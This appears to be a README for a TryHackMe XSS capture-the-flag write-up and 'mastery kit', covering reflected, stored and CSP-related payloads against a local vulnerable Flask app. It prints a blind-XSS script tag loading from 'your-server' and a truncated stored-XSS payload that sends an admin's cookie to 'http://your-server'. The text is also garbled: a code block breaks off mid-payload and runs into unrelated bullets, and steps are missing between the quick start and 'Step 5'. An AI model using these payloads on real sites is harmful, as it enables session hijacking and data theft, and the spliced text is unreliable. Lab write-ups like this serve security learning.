# XSS

--# XSS — Merry XSSMas (AoC 2025 Day 11)

**Room Link:** https://tryhackme.com/room/xss-aoc2025-merryxssmas  
**Difficulty:** Medium  
**Topics:** Reflected/Stored/DOM XSS, Payload Crafting, CSP Bypasses, Detection & Prevention, OWASP Top 10 (A03:2021 Injection)  

## Why This Repo is Exceptional
This isn't your average write-up—it's a **pro-grade XSS mastery kit**:
- **Offensive Tools**: Automated exploits + 100+ curated payloads (including polyglots & 2025 trends).
- **Defensive Arsenal**: Sigma rules, ModSecurity CRS configs, and CSP best practices.
- **Hands-On Lab**: Run a local vulnerable Flask app to test exploits safely.
- **Visual Learning**: Diagrams, screenshots, and code snippets for clarity.
- **Real-World Focus**: Bug bounty tips, LLM-assisted payload gen, and red/blue team simulations.

Ideal for pentesters, devs, and SOC analysts. Clone and hack!

## Quick Start: Local XSS Lab
```bash
git clone <repo>
cd xss/tools/vulnerable_app
pip install -r requirements.txt
python app.py  # Runs at http://localhost:5000
# Test reflected: http://localhost:5000/greet?name=<script>alert(1)</script- **Vuln Point:** Comments form stores input in backend DB, displayed to all users.
- **Payload:** `<script>document.body.innerHTML="<h1>Pwned!</h1>"</script>`
- **Method:** Submit via form → Refresh page to see persistence.
- **Flag:** Stored payload executes on load, showing `THM{STORED_XSS_FLAG}`.
- **Pro Tip:** Use blind XSS for callbacks: `<script src="http://your-server/log.js"></script>`.
- **Payload:** `<script nonce="stolen">alert(1)</script>`.

## Step 5: Final Exploitation & Flag
- Combine stored XSS to steal admin cookie: `<script>fetch('http://your-server?cookie='+d
